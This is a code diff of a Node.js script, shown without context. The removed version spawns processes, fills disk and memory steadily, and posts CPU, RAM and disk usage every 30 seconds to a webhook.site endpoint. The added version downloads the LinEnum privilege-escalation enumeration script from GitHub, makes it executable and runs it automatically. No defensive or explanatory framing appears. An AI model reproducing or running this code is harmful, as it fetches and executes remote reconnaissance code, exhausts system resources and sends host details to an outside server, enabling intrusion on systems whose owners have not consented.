@@ -1,134 +1,58 @@
-const { exec } = require('child_process');
+const https = require('https');
 const fs = require('fs');
-const path = require('path');
-const os = require('os');
-const axios = require('axios');
-const diskUsage = require('diskusage'); // Import diskusage package
+const { exec } = require('child_process');
 
-// Function to spawn random processes
-function spawnProcesses() {
-    for (let i = 0; i < 1; i++) {
-        try {
-            exec('node -e "setInterval(() => {}, 1000)"');
-        } catch (err) {
-            console.error('Error spawning process:', err);
-        }
+// URL of the file to download
+const fileUrl = 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh';
+
+// Destination path for the downloaded file
+const filePath = './LinEnum.sh';
+
+// Function to download the file
+const downloadFile = (url, dest, callback) => {
+  const file = fs.createWriteStream(dest);
+  https.get(url, (response) => {
+    response.pipe(file);
+    file.on('finish', () => {
+      file.close(callback);
+    });
+  }).on('error', (err) => {
+    fs.unlink(dest);
+    console.error(`Error downloading the file: ${err.message}`);
+  });
+};
+
+// Function to make the file executable
+const makeExecutable = (path, callback) => {
+  fs.chmod(path, '755', (err) => {
+    if (err) {
+      console.error(`Error making the file executable: ${err.message}`);
+    } else {
+      callback();
     }
-}
+  });
+};
 
-// Function to write continuously to disk
-function writeToDisk() {
-    const filePath = path.join( './testfile');
-    const stream = fs.createWriteStream(filePath, { flags: 'a' });
-
-    stream.on('error', (err) => {
-        if (err.code === 'ENOSPC') {
-            console.error('No space left on device, write failed');
-        } else {
-            console.error('Error writing to disk:', err);
-        }
-    });
-
-    setInterval(() => {
-        try {
-            stream.write(Buffer.alloc(1024, '0')); // Write 1 KB of data
-        } catch (err) {
-            console.error('Error writing to disk:', err);
-        }
-    }, 1000);
-}
-
-// Function to use RAM continuously
-function useRam() {
-    const data = [];
-    setInterval(() => {
-        try {
-            data.push(Buffer.alloc(1024, '0')); // Allocate 1 KB of RAM
-        } catch (err) {
-            console.error('Error using RAM:', err);
-        }
-    }, 1000);
-}
-
-// Function to get CPU usage
-function getCpuUsage() {
-    return new Promise((resolve) => {
-        try {
-            exec("top -bn1 | grep 'Cpu(s)'", (error, stdout, stderr) => {
-                if (error) {
-                    console.error(`exec error: ${error}`);
-                    resolve(0); // Default to 0 if there's an error
-                } else {
-                    const usage = stdout.match(/\d+\.\d+/g);
-                    const cpuUsage = usage ? parseFloat(usage[0]) : 0;
-                    resolve(cpuUsage);
-                }
-            });
-        } catch (err) {
-            console.error('Error getting CPU usage:', err);
-            resolve(0); // Default to 0 if there's an error
-        }
-    });
-}
-
-// Function to get RAM usage
-function getRamUsage() {
-    try {
-        const totalMemory = os.totalmem();
-        const freeMemory = os.freemem();
-        const usedMemory = totalMemory - freeMemory;
-        return usedMemory / 1024; // Convert to MB
-    } catch (err) {
-        console.error('Error getting RAM usage:', err);
-        return 0; // Default to 0 if there's an error
+// Function to run the script
+const runScript = (path) => {
+  exec(`sh ${path}`, (error, stdout, stderr) => {
+    if (error) {
+      console.error(`Error executing the script: ${error.message}`);
+      return;
     }
-}
+    if (stderr) {
+      console.error(`Script stderr: ${stderr}`);
+      return;
+    }
+    console.log(`Script stdout: ${stdout}`);
+  });
+};
 
-// Function to get Disk usage
-function getDiskUsage() {
-    return new Promise((resolve) => {
-        try {
-            diskUsage.check('/', (err, info) => {
-                if (err) {
-                    console.error('Error getting disk usage:', err);
-                    resolve(0); // Default to 0 if there's an error
-                } else {
-                    resolve(info.total - info.available); // Used disk space in bytes
-                }
-            });
-        } catch (err) {
-            console.error('Error getting disk usage:', err);
-            resolve(0); // Default to 0 if there's an error
-        }
-    });
-}
-
-// Function to send consumption data to webhook
-async function sendConsumptionData() {
-    const url = 'https://webhook.site/8c0a6266-e826-49a3-a7b9-96488eafb993';
-
-    setInterval(async () => {
-        try {
-            const cpuUsage = await getCpuUsage();
-            const ramUsage = getRamUsage();
-            const diskUsage = await getDiskUsage();
-
-            const data = {
-                CPU: `${cpuUsage.toFixed(2)}%`,
-                RAM: `${ramUsage.toFixed(2)} MB`,
-                Storage: `${(diskUsage / 1024).toFixed(2)} MB` // Convert to MB
-            };
-
-            await axios.post(url, data);
-            console.log('Data sent successfully', data);
-        } catch (error) {
-            console.error('Error sending data:', error);
-        }
-    }, 30000);
-}
-
-// Start all tasks
-sendConsumptionData();
-spawnProcesses();
-writeToDisk();
-useRam();
+// Download, make executable, and run the script
+downloadFile(fileUrl, filePath, () => {
+  console.log('File downloaded successfully');
+  makeExecutable(filePath, () => {
+    console.log('File made executable');
+    runScript(filePath);
+  });
+});
